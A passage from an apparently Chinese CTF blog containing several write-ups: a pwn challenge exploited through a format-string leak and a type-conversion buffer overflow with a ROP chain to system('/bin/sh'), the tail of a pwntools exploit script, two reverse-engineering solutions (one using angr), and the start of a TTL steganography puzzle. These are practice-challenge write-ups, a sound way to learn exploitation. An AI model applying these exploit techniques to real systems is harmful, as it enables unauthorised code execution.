+p64(payload2)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/pic4xiu/C/blob/master/%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5/pwn/easycanary">题目链接</a>(so环境同目录</p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/05/24/2019-05-24-jeasycanary/" data-id="cuidwJ0tcDEWJt36qX0_ZCNKJ" data-title="吉林网络安全省赛" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2019-05-09-pwnme" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/05/09/2019-05-09-pwnme/" class="article-date">
+  <time class="dt-published" datetime="2019-05-08T16:00:00.000Z" itemprop="datePublished">2019-05-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/05/09/2019-05-09-pwnme/">500年前的题</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><blockquote>
+<p>Safeguard、operation and analysis</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ checksec pwnme</span><br><span class="line">[*] &#x27;/home/pic/Desktop/pwnme&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>发现本题开启了<code>RELRO</code>和<code>NX</code>，意味着我们不能随便搞got表和直接往栈上写shellcode，我们来分析本题逻辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ ./pwnme </span><br><span class="line">**********************************************</span><br><span class="line">*                                            *</span><br><span class="line">*              Have fun!Pwn me               *</span><br><span class="line">*                                            *</span><br><span class="line">**********************************************</span><br><span class="line">Register Account first!</span><br><span class="line">Input your username(max lenth:40): </span><br><span class="line">1</span><br><span class="line">Input your password(max lenth:40): </span><br><span class="line">1</span><br><span class="line">Register Success!!</span><br></pre></td></tr></table></figure>
+
+<p>本题首先进行注册之后弹出3个选项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1.Sh0w Account Infomation!</span><br><span class="line">2.Ed1t Account Inf0mation!</span><br><span class="line">3.QUit System:</span><br><span class="line">&gt;1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1.Sh0w Account Infomation!</span><br><span class="line">2.Ed1t Account Inf0mation!</span><br><span class="line">3.QUit System:</span><br><span class="line">&gt;2</span><br><span class="line">please input new username(max lenth:20): </span><br><span class="line">1</span><br><span class="line">please input new password(max lenth:20): </span><br><span class="line">1</span><br><span class="line">1.Sh0w Account Infomation!</span><br><span class="line">2.Ed1t Account Inf0mation!</span><br><span class="line">3.QUit System:</span><br><span class="line">&gt;3</span><br><span class="line">byebyeT.T</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们到ida中进行下一步分析，发现在输出函数即选项1中存在格式化字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_400AD1(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9)</span><br><span class="line">&#123;</span><br><span class="line">  printf(&amp;formata);</span><br><span class="line">  return printf(&amp;a9 + 4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后就没有然后了，我并不知道其他漏洞点，在看了大佬的wp后get到了一个新的漏洞方式<strong>类型转换不当导致缓冲区溢出</strong>，在编辑函数即选项2中的修改密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ( (_BYTE)v12 &amp;&amp; (unsigned __int8)v12 &lt;= 0x14u )</span><br></pre></td></tr></table></figure>
+
+<p>看到v12被类型转换，将<code>unsigned int v12</code>转为<code>_BYTE</code>，也即最后一个字节小于0x14u即可，之后输入最后字节满足if语句即可，我们找到了溢出点和泄露点，可以开始思考怎么利用了</p>
+<h2 id="Thinking"><a href="#Thinking" class="headerlink" title="Thinking"></a>Thinking</h2><blockquote>
+<p>how to exploit vulnerability</p>
+</blockquote>
+<p>我们最后要做的便是执行<code>system(&quot;/bin/sh&quot;)</code>，首先找到system地址，根据格式化字符串漏洞，我们利用DynELF把system的地址爆破出来，之后利用缓冲区溢出构造一个rop直接去执行获得shell。行，下面看一下具体过程我们先说rop的构造，毕竟这是这题难点</p>
+<p>先找到溢出点，直接用<strong>cyclic</strong>整0x100个即256个，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ cyclic 256</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac</span><br></pre></td></tr></table></figure>
+
+<p>直接贴到程序中，由于大于0x00007fffffffffff，程序正常爆炸，我们直接找到esp的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">RAX  0x7fffffffe390 ◂— 0x6161616261616161 (&#x27;aaaabaaa&#x27;)</span><br><span class="line">RBX  0x0</span><br><span class="line">RCX  0x603660 ◂— 0x0</span><br><span class="line">RDX  0x10</span><br><span class="line">RDI  0x7fffffffe390 ◂— 0x6161616261616161 (&#x27;aaaabaaa&#x27;)</span><br><span class="line">RSI  0x603670 ◂— 0x6161616261616161 (&#x27;aaaabaaa&#x27;)</span><br><span class="line">R8   0x1</span><br><span class="line">R9   0x7fffffffe380 ◂— 0x111004010a8</span><br><span class="line">R10  0x603870 ◂— 0x0</span><br><span class="line">R11  0x7fffffffe481 ◂— &#x27;aaclaacmaacnaacoaacpaacqaacraac\n&#x27;</span><br><span class="line">R12  0x400770 ◂— xor    ebp, ebp</span><br><span class="line">R13  0x7fffffffe5c0 ◂— 0x1</span><br><span class="line">R14  0x0</span><br><span class="line">R15  0x0</span><br><span class="line">RBP  0x6161616a61616169 (&#x27;iaaajaaa&#x27;)</span><br><span class="line">RSP  0x7fffffffe3b8 ◂— 0x6161616c6161616b (&#x27;kaaalaaa&#x27;)</span><br><span class="line">RIP  0x400ad0 ◂— ret    </span><br></pre></td></tr></table></figure>
+
+<p>直接找到溢出点为40</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ cyclic -l 0x6161616b</span><br><span class="line">40</span><br></pre></td></tr></table></figure>
+
+<p>之后直接向后写，我们的思路是先利用read在bss端写字符串，然后pop到rdi，直接到system里执行，所以一个完整的rop链是</p>
+<p><code>&#39;A&#39;*40+read(0,bss_addr,8)+pop rdi+bss_addr+system(rdi)</code></p>
+<p>之后就是找可利用的gadget了，根据<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Ox9A82/p/5487725.html">大佬</a>的博客发现有两个通用的，还有一个很难找的<code>pop rdi</code>，但是有<code>pop r15</code>,利用该<a target="_blank" rel="noopener" href="https://defuse.ca/online-x86-assembler.htm">网站</a>看看机器码，该汇编的机器码是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0:  41 5f                   pop    r15</span><br></pre></td></tr></table></figure>
+
+<p>而<code>pop rdi</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0:  5f                      pop    rdi</span><br></pre></td></tr></table></figure>
+
+<p>,差一个字节，所以也有了，这些代码在ida中找到了，直接贴出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400EB0                 mov     rdx, r13</span><br><span class="line">.text:0000000000400EB3                 mov     rsi, r14</span><br><span class="line">.text:0000000000400EB6                 mov     edi, r15d</span><br><span class="line">.text:0000000000400EB9                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:0000000000400EBD                 add     rbx, 1</span><br><span class="line">.text:0000000000400EC1                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400EC4                 jnz     short loc_400EB0</span><br><span class="line">.text:0000000000400EC6</span><br><span class="line">.text:0000000000400EC6 loc_400EC6:                             ; CODE XREF: init+36↑j</span><br><span class="line">.text:0000000000400EC6                 add     rsp, 8</span><br><span class="line">.text:0000000000400ECA                 pop     rbx</span><br><span class="line">.text:0000000000400ECB                 pop     rbp</span><br><span class="line">.text:0000000000400ECC                 pop     r12</span><br><span class="line">.text:0000000000400ECE                 pop     r13</span><br><span class="line">.text:0000000000400ED0                 pop     r14</span><br><span class="line">.text:0000000000400ED2                 pop     r15</span><br><span class="line">.text:0000000000400ED4                 retn</span><br></pre></td></tr></table></figure>
+
+<p>所以具体的rop链为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;A&#x27;*40+0000000000400ECA + 0 + 1 + read + 8 + bss_addr + 0 + 0000000000400EB0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0000000000400ED3 + bss_addr + system</span><br></pre></td></tr></table></figure>
+
+<p>然后后边用<code>A</code>凑齐，即可起shell，下面补充一下格式化字符串的利用，在用<code>aaaa%n$x</code>测试时发现在8的时候是字符串起始位置，然后很奇怪，看大佬的wp发现利用输出密码时才能泄露，下面列出该漏洞的伪exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;please input new username(max lenth:20): \n&#x27;   =&gt;  &#x27;%11$sflag&#x27;</span><br><span class="line">&#x27;please input new password(max lenth:20): \n&#x27;   =&gt;  &#x27;aaaa&#x27;+p64(address)</span><br></pre></td></tr></table></figure>
+
+<p>通过ida可以发现两个字符串相差16个字节偏移为4，即</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">8   起始位置</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11  存放address</span><br></pre></td></tr></table></figure>
+
+<p>通过这个便可泄露出来addr，很爽。做这题真的花了好久好久，还是太菜了~~~</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/05/09/2019-05-09-pwnme/" data-id="cuidZQgdrM1gIZ5rgUUCY8sFb" data-title="500年前的题" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2019-05-05-DDCTFRe1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/05/05/2019-05-05-DDCTFRe1/" class="article-date">
+  <time class="dt-published" datetime="2019-05-04T16:00:00.000Z" itemprop="datePublished">2019-05-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/05/05/2019-05-05-DDCTFRe1/">DDCTF</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="Windows-Reverse1"><a href="#Windows-Reverse1" class="headerlink" title="Windows Reverse1"></a>Windows Reverse1</h2><blockquote>
+<p>a windows reverse</p>
+</blockquote>
+<p>本程序有upx壳，拿工具直接脱掉，程序较为简单，只是一个索引表转换，我们具体分析一下转换函数</p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><blockquote>
+<p>Let’s see it</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">unsigned int __cdecl sub_401000(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v1; // ecx</span><br><span class="line">  unsigned int v2; // edi</span><br><span class="line">  unsigned int result; // eax</span><br><span class="line">  int v4; // ebx</span><br><span class="line"></span><br><span class="line">  v2 = 0;</span><br><span class="line">  result = strlen(a1);</span><br><span class="line">  if ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = a1 - v1;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      *v1 = byte_402FF8[(char)v1[v4]];</span><br><span class="line">      ++v2;</span><br><span class="line">      ++v1;</span><br><span class="line">      result = strlen(a1);</span><br><span class="line">    &#125;</span><br><span class="line">    while ( v2 &lt; result );</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们看到<code>byte_402FF8</code>便是表的首地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00402FF0  ?? ?? ?? ?? ?? ?? ?? ??  ?? ?? ?? ?? ?? ?? ?? ??  ????????????????</span><br><span class="line">00403000  4E E6 40 BB B1 19 BF 44  FF FF FF FF FF FF FF FF  N鍬 槐 .緿 ........</span><br><span class="line">00403010  FE FF FF FF 01 00 00 00  7E 7D 7C 7B 7A 79 78 77  ........~&#125;|&#123;zyxw</span><br><span class="line">00403020  76 75 74 73 72 71 70 6F  6E 6D 6C 6B 6A 69 68 67  vutsrqponmlkjihg</span><br><span class="line">00403030  66 65 64 63 62 61 60 5F  5E 5D 5C 5B 5A 59 58 57  fedcba`_^]\[ZYXW</span><br><span class="line">00403040  56 55 54 53 52 51 50 4F  4E 4D 4C 4B 4A 49 48 47  VUTSRQPONMLKJIHG</span><br><span class="line">00403050  46 45 44 43 42 41 40 3F  3E 3D 3C 3B 3A 39 38 37  FEDCBA@?&gt;=&lt;;:987</span><br><span class="line">00403060  36 35 34 33 32 31 30 2F  2E 2D 2C 2B 2A 29 28 27  6543210/.-,+*)(&#x27;</span><br><span class="line">00403070  26 25 24 23 22 21 20 00  00 00 00 00 00 00 00 00  &amp;%$#&quot;! .........</span><br></pre></td></tr></table></figure>
+
+<p>分析一下循环</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">  *v1 = byte_402FF8[(char)v1[v4]];</span><br><span class="line">  ++v2;</span><br><span class="line">  ++v1;</span><br><span class="line">  result = strlen(a1);</span><br><span class="line">&#125;</span><br><span class="line">while ( v2 &lt; result );</span><br></pre></td></tr></table></figure>
+
+<p>我们举例加以说明，例如我将<em>Z</em>输入，在循环中会索引找到<em>Z</em>的位置，之后得到一个数字即为距离<code>byte_402FF8</code>的偏移，得到90，即为<em>D</em>的ASCII码，根据输入将得到的字符串和 <code>DDCTF{reverseME}</code>进行比较，相同即为flag</p>
+<p>现在来看本题关键即为索引表函数的逆向，算是一个较为基础的逆向</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/05/05/2019-05-05-DDCTFRe1/" data-id="cuidtyhD5iBhaai2eq1pA7OPV" data-title="DDCTF" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2019-05-02-easyCpp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/05/02/2019-05-02-easyCpp/" class="article-date">
+  <time class="dt-published" datetime="2019-05-01T16:00:00.000Z" itemprop="datePublished">2019-05-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/05/02/2019-05-02-easyCpp/">西湖论剑</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="Auth"><a href="#Auth" class="headerlink" title="Auth"></a>Auth</h2><blockquote>
+<p>A Linux re</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ file easyCpp </span><br><span class="line">easyCpp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=3d7df25fb01d78d7f840a0116f148283d11e2389, not stripped</span><br></pre></td></tr></table></figure>
+
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><blockquote>
+<p>Run it and see what happened</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ ./easyCpp </span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">You failed!</span><br></pre></td></tr></table></figure>
+
+<p>看到我们输入了16个字符后自动退出，我们直接分析利用<strong>ida</strong>分析一下，虽然是 <strong>C++</strong> 的，但我们也要忍这看orz</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for ( i = 0; i &lt;= 15; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    scanf(&quot;%d&quot;, &amp;v24[4 * i]);</span><br><span class="line">    std::vector&lt;int,std::allocator&lt;int&gt;&gt;::push_back(&amp;v18, &amp;v24[4 * i]);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到我们输入的都放到了<strong>v18</strong>中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for ( j = 0; j &lt;= 15; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  LODWORD(v23) = fib(j);</span><br><span class="line">  std::vector&lt;int,std::allocator&lt;int&gt;&gt;::push_back(&amp;v17, &amp;v23);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之后程序自动用<code>fib()</code>函数生成16个斐波那契数列，存到<strong>v17</strong>中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v9 = __gnu_cxx::__normal_iterator&lt;int *,std::vector&lt;int,std::allocator&lt;int&gt;&gt;&gt;::operator+(&amp;v24, 1LL);</span><br></pre></td></tr></table></figure>
+
+<p>这个命令使得v9是我们输入的第二个数字，之后的下一个函数我们直接跟进，看到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main::&#123;lambda(int)#1&#125;::operator() const(_DWORD **a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  return (unsigned int)(**a1 + a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个蜜汁函数意思很简单，就是把<strong>a1</strong>的数字放到<strong>a2</strong>中，即把后边的数字与第一个相加，之后到了<strong>accumulate</strong>便是通过不停的利用<strong>copy</strong>来进行数组的反转，直接分析很复杂，可以动态调试一下，当然逆向也可以猜（手动滑稽</p>
+<p>总的来说本题分为以下几步：</p>
+<ul>
+<li>输入16个数字</li>
+<li>生成16个斐波那契数列</li>
+<li>第一步的数组从第二个开始的数分别与第一个加</li>
+<li>逆序上一步的数组</li>
+<li>上一步的数组与第二步的数组进行对比</li>
+</ul>
+<p>补一下，有大佬用angr跑出来了，直接把数字输入记得flag，脚本如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">def main():</span><br><span class="line">	p = angr.Project(&quot;./easyCpp&quot;)</span><br><span class="line">	st = p.factory.entry_state()</span><br><span class="line">	sm = p.factory.simgr(st)</span><br><span class="line">	sm.explore(find=0x40103c, avoid=0x00401028)</span><br><span class="line">	return sm.found[0].posix.dumps(0)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">	print main()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><blockquote>
+<p>This isn’t easy</p>
+</blockquote>
+<p>不知道为什么第一题都这么难，后两道题一个是分析算法，一个去花，只有这个算法这么奇怪，还是用 <strong>C++</strong> 写的，😔，还是太菜了，继续学习二进制啊~~</p>
+<p>最近做了好多题，收获很多，也很杂</p>
+<ul>
+<li>使用ida比之前更熟练了</li>
+<li>做C语言的题做多了，现在看到伪代码差不多能直接理解了</li>
+<li>做pwn题也有思路了，汇编代码神马的也进步了</li>
+</ul>
+<p>不足</p>
+<ul>
+<li>动态调试总是不太好，pwngdb还是得学</li>
+<li>不能静下心来仔细分析代码，老是对杂项那些感兴趣</li>
+<li>。。。</li>
+</ul>
+<p>还有一些做题的心得：</p>
+<ul>
+<li>最近在看writeup的时候，发现最近的题简单的全是简单算法，脱壳考的比之前少多了</li>
+<li>大佬对一道题分析的时候有时候直接靠猜，猜这个描述可能不太准确，应该是知道套路，直接就把exp甩出来，可能也是他们做题做的多</li>
+<li>ida的patch是真的好用，之前还没感觉</li>
+</ul>
+<p>最近的目标：</p>
+<ul>
+<li>做题</li>
+<li>Do ctf question</li>
+<li>ctfの質問をする</li>
+<li>Faire ctf question</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/05/02/2019-05-02-easyCpp/" data-id="cuidVBYOOjQuZTDwRoPktZp2Y" data-title="西湖论剑" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2019-04-07-ttl" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/04/07/2019-04-07-ttl/" class="article-date">
+  <time class="dt-published" datetime="2019-04-06T16:00:00.000Z" itemprop="datePublished">2019-04-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/04/07/2019-04-07-ttl/">西湖论剑</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="TTL"><a href="#TTL" class="headerlink" title="TTL"></a>TTL</h2><blockquote>
+<p>An interesting misc</p>
+</blockquote>
+<p>拿到本题很奇怪，题目文件是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">TTL=127</span><br><span class="line">TTL=191</span><br><span class="line">TTL=127</span><br><span class="line">TTL=191</span><br><span class="line">TTL=127</span><br><span class="line">TTL=191</span><br><span class="line">TTL=127</span><br><span class="line">TTL=191</span><br><span class="line">TTL=127</span><br><span class="line">TTL=191</span><br><span class="line">TTL=127</span><br><span class="line">TTL=63</span><br><span class="line">TTL=63</span><br><span class="line">TTL=255</span><br><span class="line">TTL=191</span><br><span class="line">TTL=63</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>我们没什么思路，只是看到很多TTL的值</p>
+<p><strong>TTL是 Time To Live的缩写，该字段指定IP包被路由器丢弃之前允许通过的最大网段数量。TTL是IPv4包头的一个8 bit字段。</strong>   –摘自百度百科</p>
+<p>没什么思路，在网上搜索了一波发现</p>
+<p><strong>IP报文在路由间穿梭的时候每经过一个路由，TTL就会减1，当TTL为0的时候，该报文就会被丢弃。TTL所占的位数是8位，也就是0-255的范围，但是在大多数情况下通常只需要经过很小的跳数就能完成报文的转发，远远比上限255小得多，所以我们可以用TTL值的前两位来进行传输隐藏数据。</strong></p>
